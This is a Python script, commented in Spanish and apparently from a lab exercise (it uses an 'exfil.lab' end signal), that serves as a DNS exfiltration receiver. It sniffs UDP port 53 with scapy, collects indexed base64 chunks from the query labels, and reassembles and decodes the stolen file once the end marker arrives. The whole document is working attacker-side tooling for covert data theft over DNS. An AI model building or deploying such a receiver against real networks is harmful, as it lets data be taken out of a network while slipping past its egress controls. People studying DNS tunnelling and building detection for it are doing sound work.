from scapy.all import *
import base64
import re
import time
import sys

# =====================================================
#    SERVIDOR DNS - RECEPTOR DE EXFILTRACIÓN
# =====================================================

# Inicializar colorama
try:
    from colorama import init as colorama_init, Fore, Style
    colorama_init()
except Exception:
    # Fallback sin colorama (para evitar errores)
    class _F:
        RESET_ALL = ""
        RESET = ""
        RED = ""
        GREEN = ""
        YELLOW = ""
        CYAN = ""
        MAGENTA = ""
        BLUE = ""
    Fore = _F()
    Style = _F()

capturados = {}

# Base64 URL-safe
BASE64_REGEX = re.compile(r'^[a-zA-Z0-9_-]+$')

# =====================================================
#    FUNCIONES DE FORMATO / ESTILO
# =====================================================

def log_info(msg):
    print(f"{Fore.CYAN}[i]{Style.RESET_ALL} {msg}")

def log_ok(msg):
    print(f"{Fore.GREEN}[✓]{Style.RESET_ALL} {msg}")

def log_warn(msg):
    print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {msg}")

def log_error(msg):
    print(f"{Fore.RED}[✗]{Style.RESET_ALL} {msg}")

def log_debug(msg):
    print(f"{Fore.MAGENTA}[~]{Style.RESET_ALL} {msg}")

def timestamp():
    return time.strftime("%H:%M:%S")

# =====================================================
#    FUNCIONES PRINCIPALES
# =====================================================

def procesar_paquete(pkt):
    """Procesa cada consulta DNS"""
    if pkt.haslayer(DNSQR):
        query = pkt[DNSQR].qname.decode().strip('.')
        now = timestamp()

        if query == "fin.exfil.lab":
            log_info(f"{now} Señal de fin recibida.")
            reconstruir_archivo()
            return

        try:
            partes = query.split(".")
            if len(partes) >= 2:
                chunk = partes[0]
                idx = int(partes[1])

                if not BASE64_REGEX.match(chunk):
                    log_warn(f"{now} Chunk inválido ignorado: {chunk}")
                    return

                if idx not in capturados:
                    capturados[idx] = chunk
                    print(f"{Fore.GREEN}[{now}] [+] Recibido chunk {idx}: {Fore.YELLOW}{chunk}{Style.RESET_ALL}")
                else:
                    log_debug(f"{now} Chunk duplicado ignorado: {idx}")
        except Exception as e:
            log_error(f"{now} Error procesando query '{query}': {e}")

def reconstruir_archivo():
    """Reconstruye el archivo cuando se recibe la señal de fin"""
    log_info("Reconstruyendo archivo...")

    if not capturados:
        log_warn("No se recibieron datos.")
        return

    indices = sorted(capturados.keys())
    faltantes = [i for i in range(indices[0], indices[-1] + 1) if i not in capturados]

    if faltantes:
        log_warn(f"Faltan los siguientes chunks: {faltantes}")
        log_error("Abortando reconstrucción.")
        return

    joined = ''.join(capturados[i] for i in indices)
    log_debug(f"Datos combinados (primeros 200 caracteres): {joined[:200]}{'...' if len(joined) > 200 else ''}")

    padding = '=' * ((4 - len(joined) % 4) % 4)
    joined_padded = joined + padding

    try:
        decoded = base64.urlsafe_b64decode(joined_padded)
    except Exception as e:
        log_error(f"Falló la decodificación Base64: {e}")
        with open("fallo_base64.txt", "w") as f:
            f.write(joined_padded)
        log_warn("Se guardó el string combinado en 'fallo_base64.txt' para análisis.")
        return

    with open("reconstruido.txt", "wb") as f:
        f.write(decoded)

    log_ok("Archivo reconstruido exitosamente como 'reconstruido.txt'.")

def iniciar_servidor():
    """Inicia el servidor DNS"""
    banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════╗
║        DNS Receiver - Exfiltración        ║
╚══════════════════════════════════════════╝{Style.RESET_ALL}
    """
    print(banner)
    log_info("Escuchando tráfico DNS en el puerto 53 (requiere sudo/root)...")
    log_info("Presiona Ctrl+C para detener.\n")

    try:
        sniff(filter="udp port 53", prn=procesar_paquete, store=0)
    except PermissionError:
        log_error("Permiso denegado. Ejecuta con sudo o como administrador.")
    except KeyboardInterrupt:
        print("\n" + Fore.YELLOW + "[*] Servidor detenido por el usuario." + Style.RESET_ALL)
        sys.exit(0)

# =====================================================
#    MAIN
# =====================================================

if __name__ == "__main__":
    iniciar_servidor()
